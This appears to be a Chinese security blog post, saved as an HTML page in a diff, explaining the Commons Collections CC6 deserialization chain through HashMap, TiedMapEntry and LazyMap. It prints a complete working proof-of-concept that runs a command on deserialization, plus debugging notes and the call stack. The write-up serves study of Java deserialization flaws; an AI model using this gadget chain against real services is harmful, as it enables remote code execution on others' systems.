@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="注：CC6不受JDK版本和commons-collections版本的限制，使用到的类都是一些比较原生态的类，限制没那么多。 实战分析实现RCE的利用点还是和CC1的LazyMap链一样，利用到了InvokerTransformer类和LazyMap类实现。CC1的LazyMap链是使用到了AnnotationInvocationHandler的动态代理来调用到LazyMap类的get方法 CC6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC6-HashMap链">
+<meta property="og:url" content="https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/index.html">
+<meta property="og:site_name" content="sh1y1n9aI&#39;s blog">
+<meta property="og:description" content="注：CC6不受JDK版本和commons-collections版本的限制，使用到的类都是一些比较原生态的类，限制没那么多。 实战分析实现RCE的利用点还是和CC1的LazyMap链一样，利用到了InvokerTransformer类和LazyMap类实现。CC1的LazyMap链是使用到了AnnotationInvocationHandler的动态代理来调用到LazyMap类的get方法 CC6">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001526837.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001541140.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001557746.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001619675.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001654269.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001712794.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001738825.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001809526.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001826969.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001850676.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001906986.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001921102.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424001947475.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424002001421.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424002013301.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424002030320.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240424002044274.png">
+<meta property="article:published_time" content="2023-03-06T16:14:07.000Z">
+<meta property="article:modified_time" content="2024-04-23T16:21:29.890Z">
+<meta property="article:author" content="sh1y1n9aI">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="Commons Collections">
+<meta property="article:tag" content="HashMap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sh1y1n9ai.github.io/images/image-20240424001526837.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CC6-HashMap链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="sh1y1n9aI&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/03/08/CC3-TemplatesImpl%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/03/06/CC1-LazyMap%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&text=CC6-HashMap链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&is_video=false&description=CC6-HashMap链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC6-HashMap链&body=Check out this article: https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&name=CC6-HashMap链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&t=CC6-HashMap链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">实战分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">2.</span> <span class="toc-text">调用栈</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CC6-HashMap链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">sh1y1n9aI</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-06T16:14:07.000Z" class="dt-published" itemprop="datePublished">2023-03-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/">Java反序列化漏洞专题</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC%E9%93%BE/" rel="tag">CC链</a>, <a class="p-category" href="/tags/Commons-Collections/" rel="tag">Commons Collections</a>, <a class="p-category" href="/tags/HashMap/" rel="tag">HashMap</a>
+    </div>
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>注：CC6不受JDK版本和commons-collections版本的限制，使用到的类都是一些比较原生态的类，限制没那么多。</p>
+<h3 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h3><p>实现RCE的利用点还是和CC1的LazyMap链一样，利用到了InvokerTransformer类和LazyMap类实现。CC1的LazyMap链是使用到了AnnotationInvocationHandler的动态代理来调用到LazyMap类的get方法</p>
+<p>CC6的话，利用到的类是：TiedMapEntry类，在getValue方法中，通过map参数去调用get方法</p>
+<p><img src="/../images/image-20240424001526837.png" alt="image-20240424001526837"></p>
+<p>map参数在构造方法中获得可控，那么传入LazyMap类即可构成链子</p>
+<p><img src="/../images/image-20240424001541140.png" alt="image-20240424001541140"></p>
+<p>接下来找哪里调用了getValue方法，搜索发现在本类中有个hashCode方法调用到了getValue方法</p>
+<p><img src="/../images/image-20240424001557746.png" alt="image-20240424001557746"></p>
+<p>看到hashCode方法，有经验的话；第一反应就能反应到HashMap类，HashMap类中的readObject方法，会间接触发调用到任意对象的hashCode方法</p>
+<p><img src="/../images/image-20240424001619675.png" alt="image-20240424001619675"></p>
+<p>hash方法中可传入任意对象，调用任意对象的hashCode方法，那么这里就可以给key参数传入TiedMapEntry类</p>
+<p><img src="/../images/image-20240424001654269.png" alt="image-20240424001654269"></p>
+<p>编写初步POC，因为TiedMapEntry类是public修饰的，所以不需要通过反射来调用</p>
+<p><img src="/../images/image-20240424001712794.png" alt="image-20240424001712794"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transforms = new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class), // 必须写在第一行，先获得Runtime类</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class="line">// 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="line">hashMap2.put(tiedMapEntry,&quot;bbb&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>运行poc，发现在序列化的时候就弹出了计算器</p>
+<p><img src="/../images/image-20240424001738825.png" alt="image-20240424001738825"></p>
+<p>分析：</p>
+<p>CC6和URLDNS那条链子一样，HashMap类的put方法也会触发hashCode方法，所以在序列化之前就构成了链子的入口。需要修改POC，可以在put的时候，调用一个不是目标利用点的地方，这样就不会触发RCE了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap1,new ConstantTransformer(1));</span><br></pre></td></tr></table></figure>
+
+<p>这样子运行后，就不会调用到RCE的地方</p>
+<p><img src="/../images/image-20240424001809526.png" alt="image-20240424001809526"></p>
+<p>再通过反射，动态修改LazyMap类中的decorate方法的第二个参数，第二个参数是factory</p>
+<p><img src="/../images/image-20240424001826969.png" alt="image-20240424001826969"></p>
+<p>编写POC，这样在put的时候，因为链子没连上就不会触发RCE；在put结束后，通过反射又改回factory参数的值，重新连上链子；序列化的时候，最终存入的内容是成功的链子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 反射修改LazyMap类的factory参数</span><br><span class="line">Class c = LazyMap.class;</span><br><span class="line">Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">factoryField.setAccessible(true);</span><br><span class="line">factoryField.set(decorateMap,chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240424001850676.png" alt="image-20240424001850676"></p>
+<p>取消注释反序列化函数，看看能否正常RCE；执行后发现仍然不弹出计算器</p>
+<p><img src="/../images/image-20240424001906986.png" alt="image-20240424001906986"></p>
+<p>注释反序列化函数，debug下个断点，调试一下看看；发现在序列化的时候，会进行put操作，在hashmap1集合中加入一个键值对</p>
+<p><img src="/../images/image-20240424001921102.png" alt="image-20240424001921102"></p>
+<p>查看hashmap1集合的内容</p>
+<p><img src="/../images/image-20240424001947475.png" alt="image-20240424001947475"></p>
+<p>注释序列化函数，取消注释反序列化函数，重新debug；发现无法进入IF判断了，也就无法执行transform方法，构不成链子</p>
+<p><img src="/../images/image-20240424002001421.png" alt="image-20240424002001421"></p>
+<p>通过计算表达式的结果，发现返回结果是true，所以进入不了IF判断</p>
+<p><img src="/../images/image-20240424002013301.png" alt="image-20240424002013301"></p>
+<p>map集合当前的键名是hashmap1，键值是aaa，这是之前序列化的时候传进来的。get方法的形参key的内容也是aaa，所以最后才导致表达式【map.containsKey(key)】返回结果是true，进入不了IF判断</p>
+<p><img src="/../images/image-20240424002030320.png" alt="image-20240424002030320"></p>
+<p>解决办法，删除hashmap1集合的键值即可；执行poc，成功弹出计算器</p>
+<p><img src="/../images/image-20240424002044274.png" alt="image-20240424002044274"></p>
+<p>完整POC如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author shiyingai</span><br><span class="line"> * @create 2023-03-08 2:39</span><br><span class="line"> */</span><br><span class="line">public class CC6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class), // 必须写在第一行，先获得Runtime类</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class="line">        // 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap1,new ConstantTransformer(1));</span><br><span class="line">        </span><br><span class="line">        TiedMapEntry tiedMapEntry =  new TiedMapEntry(decorateMap,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,&quot;bbb&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(decorateMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        decorateMap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap2);</span><br><span class="line"></span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-&gt;ObjectInputStream.readObject()</span><br><span class="line">    -&gt;HashMap.readObject()</span><br><span class="line">        -&gt;HashMap.hash()    </span><br><span class="line">            -&gt;TiedMapEntry.hashCode()</span><br><span class="line">                -&gt;TiedMapEntry.getValue()</span><br><span class="line">                    -&gt;LazyMap.get()</span><br><span class="line">                        -&gt;ChainedTransformer.transform()</span><br><span class="line">                            -&gt;ConstantTransformer.transform()   </span><br><span class="line">                                -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">实战分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">2.</span> <span class="toc-text">调用栈</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&text=CC6-HashMap链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&is_video=false&description=CC6-HashMap链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC6-HashMap链&body=Check out this article: https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&title=CC6-HashMap链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&name=CC6-HashMap链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/03/07/CC6-HashMap%E9%93%BE/&t=CC6-HashMap链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2024
+    sh1y1n9aI
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--  
+        <li><a href="/">首页</a></li>
+        
+        <li><a href="/archives/">归档</a></li>
+        
+        <li><a href="/categories/">分类</a></li>
+        
+        <li><a href="/tags/">标签</a></li>
+        
+        <li><a href="/search/">搜索</a></li>
+        
+        <li><a href="/about/">关于</a></li>
+          -->
+
+        
+              <!-- 不蒜子统计 -->
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <!--  <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>  -->
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
